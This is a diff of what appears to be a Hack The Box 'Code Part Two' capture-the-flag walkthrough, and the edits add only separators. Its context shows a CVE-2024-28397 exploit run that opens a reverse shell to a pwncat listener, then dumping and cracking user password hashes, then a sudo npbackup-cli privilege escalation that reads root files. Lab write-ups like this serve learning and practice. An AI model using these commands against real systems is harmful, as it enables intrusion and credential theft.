@@ -27,13 +27,13 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Oct 28 03:29:34 2025 -- 1 IP address (1 host up) scanned in 110.30 seconds
-
+_______________________________________________________________________________________________________________________________________________________________
 # We find a CVE :CVE-2024-28397
 
     # start listener
     ┌──(kali㉿kali)-[~/HAckthebox/Code Part TWo]
     └─$ pwncat -l 8888
-
+__________________________________________________________________________________________________________
 # Exploiting the script
           ──(kali㉿kali)-[~/HAckthebox/Code Part TWo/Tools/CVE-2024-28397]
           └─$ python3 exploit.py --target http://10.10.11.82:8000/run_code --lhost 10.10.14.156 --lport 8888
@@ -57,7 +57,8 @@ OS and Service detection performed. Please report any incorrect results at https
           [+] Response: {"error":"'NoneType' object is not callable"}
           
           [+] Check your netcat listener for the reverse shell!
- 
+ __________________________________________________________________________________________________________
+#got the shell
 ┌──(kali㉿kali)-[~/HAckthebox/Code Part TWo]
     └─$ pwncat -l 8888
     ls
@@ -67,16 +68,16 @@ OS and Service detection performed. Please report any incorrect results at https
     requirements.txt
     static
     templates
-
+_______________________________________________________________________________________________________________________________________________________________
 # stabilizing the shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 app@codeparttwo:~/app/instance$ l
-
+_____________________________________________________
 # foudn a database file
 app@codeparttwo:~/app/instance$ ls
 ls
 users.db
-
+_____________________________________________________
 #extracting hashes
 app@codeparttwo:~/app/instance$ sqlite3 users.db
 sqlite3 users.db
@@ -101,7 +102,7 @@ SELECT * FROM user;
 1|marco|649c9d65a206a75f5abe509fe128bce5
 2|app|a97588c0e2fa3a024876339e27aeb42e
 sqlite>
-
+__________________________________________________________________________________________________________
 # cracked the hash
 ┌──(kali㉿kali)-[~/HAckthebox/Code Part TWo]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
@@ -117,7 +118,7 @@ Session completed.
 ?:sweetangelbabylove
 
 1 password hash cracked, 1 left
-
+__________________________________________________________________________________________________________
 #logged a marco and finding permissions
 marco@codeparttwo:~$  sudo -l
  sudo -l
@@ -128,7 +129,7 @@ Matching Defaults entries for marco on codeparttwo:
 User marco may run the following commands on codeparttwo:
     (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
 marco@codeparttwo:~$
-
+__________________________________________________________________________________________________________
 #Priv_Esc
 # 1. Edit npbackup.conf so backup_opts points to /root
 sed -i 's|/home/app/app/|/root|' npbackup.conf
@@ -146,4 +147,4 @@ sudo npbackup-cli -c npbackup.conf --list
 sudo npbackup-cli -c npbackup.conf -f --dump /root/root.txt
 
 Happy hunting
-
+____________________________________________________________________________________________________________________________________________________________________________________________________________________
